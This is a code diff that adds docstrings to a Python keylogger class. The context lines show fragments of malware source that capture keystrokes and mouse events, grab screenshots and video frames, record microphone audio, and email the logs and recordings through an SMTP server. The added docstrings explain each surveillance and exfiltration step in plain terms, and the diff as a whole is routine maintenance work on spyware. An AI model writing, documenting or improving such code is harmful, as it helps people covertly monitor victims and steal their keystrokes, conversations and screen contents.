@@ -92,6 +92,19 @@ class Keylogger:
             logging.error(f"Error in on_press method: {e}")
 
     def check_idle(self, current_time):
+        """
+        Check if the user is idle.
+
+        This method checks if the user is idle by comparing the current time to the last activity time.
+        If the user is idle, it sets the is_active flag to False and stops the listener. If the user is
+        active, it sets the is_active flag to True and updates the last activity time.
+
+        Args:
+            current_time (float): The current time in seconds since the epoch.
+
+        Returns:
+            None
+        """ 
         try:
             if current_time - self.last_activity_time >= self.idle_time:
                 self.is_active = False
@@ -103,6 +116,18 @@ class Keylogger:
             logging.error(f"Error in check_idle method: {e}")
 
     def stop_listening(self):
+        """
+        Stop listening for events.
+
+        This method releases the video capture and video writer resources, if they exist, and then calls
+        the superclass's stop_listening method.
+
+        Args:
+            None
+
+        Returns:
+            None
+        """
         try:
             self.video_capture.release()
 
@@ -114,6 +139,19 @@ class Keylogger:
             logging.error(f"Error in stop_listening method: {e}")
 
     def on_move(self, x, y):
+        """
+        Handle a mouse move event.
+
+        This method is called when the mouse is moved. It appends a tuple of the form ('move', x, y) to
+        the mouse_events list and updates the last activity time if the user is active.
+
+        Args:
+            x (int): The x-coordinate of the mouse.
+            y (int): The y-coordinate of the mouse.
+
+        Returns:
+            None
+        """
         try:
             if self.is_active:  # added check to capture mouse movements only when user is active
                 self.mouse_events.append(('move', x, y))
@@ -122,6 +160,21 @@ class Keylogger:
             logging.error(f"Error in on_move method: {e}")
 
     def on_click(self, x, y, button, pressed):
+        """
+        Handle a mouse click event.
+
+        This method is called when a mouse button is clicked. It appends a tuple of the form ('click', x, y, button) to
+        the mouse_events list and updates the last activity time if the user is active.
+
+        Args:
+            x (int): The x-coordinate of the mouse.
+            y (int): The y-coordinate of the mouse.
+            button (str): The name of the button that was clicked (e.g., 'left', 'right').
+            pressed (bool): True if the button was pressed, False if it was released.
+
+        Returns:
+            None
+        """
         try:
             if self.is_active:  # added check to capture mouse movements only when user is active
                 if pressed:
@@ -131,6 +184,21 @@ class Keylogger:
             logging.error(f"Error in on_click method: {e}")
 
     def on_scroll(self, x, y, dx, dy):
+        """
+        Handle a mouse scroll event.
+
+        This method is called when the mouse wheel is scrolled. It appends a tuple of the form
+        ('scroll', x, y, dx, dy) to the mouse_events list and updates the last activity time if the user is active.
+
+        Args:
+            x (int): The x-coordinate of the mouse.
+            y (int): The y-coordinate of the mouse.
+            dx (int): The horizontal scroll distance.
+            dy (int): The vertical scroll distance.
+
+        Returns:
+            None
+        """
         try:
             if self.is_active:  # added check to capture mouse movements only when user is active
                 self.mouse_events.append(('scroll', x, y, dx, dy))
@@ -139,6 +207,18 @@ class Keylogger:
             logging.error(f"Error in on_scroll method: {e}")
 
     def send_email(self):
+        """
+        Send an email with the log file and audio recording as attachments.
+
+        This method constructs a MIME message with the log file and audio recording as attachments and
+        sends it to the configured SMTP server.
+
+        Args:
+            None
+
+        Returns:
+            None
+        """
         try:
             msg = MIMEMultipart()
             msg['From'] = SMTP_USERNAME
@@ -166,6 +246,17 @@ class Keylogger:
 
 
     def record_audio(self):
+        """
+        Record audio for five seconds and save it to a WAV file.
+
+        This method uses PyAudio to record audio for five seconds and saves it to a WAV file.
+
+        Args:
+            None
+
+        Returns:
+            None
+        """
         try:
             CHUNK = 1024
             FORMAT = pyaudio.paInt16
@@ -205,6 +296,21 @@ class Keylogger:
 
 
     def write_file(self):
+        """
+        Write the keystrokes and mouse events to a log file.
+
+        The function opens the log file in 'append' mode, iterates over the recorded keystrokes and writes them
+        to the file. The function also writes any recorded mouse events to the file.
+
+        Args:
+            self: The Keylogger object.
+
+        Returns:
+            None.
+
+        Raises:
+            IOError: An error occurred while writing to the log file.
+        """
         try:
             with open(self.log_file, "a") as f:
                 for key in self.keys:
@@ -220,6 +326,23 @@ class Keylogger:
 
 
     def on_release(self, key):
+        """
+        Handles the release of a keyboard key.
+
+        The function checks if the 'esc' key was released and returns False if so. Otherwise, it appends the 
+        released key to the list of recorded mouse events and prints the event to the console. The function
+        then checks if the system is idle and if so, captures a screenshot.
+
+        Args:
+            self: The Keylogger object.
+            key: The key that was released.
+
+        Returns:
+            False if the 'esc' key was released, None otherwise.
+
+        Raises:
+            None.
+        """
         try:
             if key == Key.esc:
                 return False
@@ -232,6 +355,21 @@ class Keylogger:
             print(f"Error on key release: {e}")
    
     def start(self):
+        """
+        Starts the keylogger.
+
+        The function starts two listener objects (one for keyboard events and one for mouse events) and 
+        waits for them to join.
+
+        Args:
+            self: The Keylogger object.
+
+        Returns:
+            None.
+
+        Raises:
+            Exception: An error occurred while starting the listener.
+        """
         try:
             with Listener(on_press=self.on_press, on_release=self.on_release) as listener, \
                     MouseListener(on_move=self.on_move, on_click=self.on_click, on_scroll=self.on_scroll) as mouse_listener:
@@ -241,6 +379,21 @@ class Keylogger:
 
 
     def capture_screen(self):
+        """
+        Captures a screenshot and video frame (if available).
+
+        The function captures a screenshot and saves it to disk, and also captures a video frame (if available)
+        and writes it to disk. If a video writer object has not been initialized, the function initializes it.
+
+        Args:
+            self: The Keylogger object.
+
+        Returns:
+            None.
+
+        Raises:
+            Exception: An error occurred while capturing the screen or writing the video.
+        """
         try:
             filename = f"{int(time.time() * 1000)}.png"
             im = ImageGrab.grab()
@@ -265,6 +418,11 @@ class Keylogger:
 
 
 if __name__ == "__main__":
+    """
+    Runs the keylogger when the script is executed.
+
+    Creates a new Keylogger object and starts it.
+    """
     keylogger = Keylogger()
     keylogger.start()
 
